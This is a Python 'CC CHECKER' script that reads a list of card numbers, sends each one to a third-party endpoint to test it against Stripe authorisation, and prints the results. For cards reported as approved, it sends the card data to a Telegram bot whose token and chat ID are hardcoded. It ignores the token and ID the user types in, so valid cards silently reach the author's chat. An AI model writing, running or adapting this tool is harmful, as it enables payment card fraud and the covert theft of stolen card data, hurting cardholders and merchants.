import pyfiglet,requests,os,datetime
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
import os
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
output = render('MEGA  ', colors=['yellow', 'white'], align='center')
print(output)
combo=input(F+'Combo ismini gir :'+X)
file=open(f'{combo}',"+r")
logo = pyfiglet.figlet_format('          CC CHECKER ')
print(Z+logo)
o=("#====================================##============================")
print (F+'💡')
print(F+o)
token=input(F+'TOKEN :'+X)
ID=input(X+' ID :'+B)

            
print(C+o)
start_num = 0
for P in file.readlines():
 P=P.replace('\n', '')
 start_num += 1
 msg = requests.get(f'https://dev-joker32.pantheonsite.io/Api/JOKER/st.php?lista={P}').text
 if "✅" in msg or "CCN" in msg:
 	print(F+f'[ {start_num} ]',P,' ➜ ',msg)
 	mgs1=f'''
𝗖𝗖 ⇾ {P}
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⇾ Stripe Auth
𝘾𝘼𝙍𝘿 𝙎𝙏𝘼𝙏𝙐𝙎 ⇾ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙! ✅
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ⇾ {msg}
━━━━━━━━━━━━━━━━━  
◆ 𝑩𝒀: @anomsofoniyas '''
 	tlg = f"https://api.telegram.org/bot6674914635:AAFAzSDseccmE5iZp8MdT4Wt84sfVGTaXDY/sendMessage?chat_id=1842801429&text={mgs1}"
 	i = requests.post(tlg)
 else:
 	print(Z+f'[ {start_num} ]',P,' ➜ ',msg)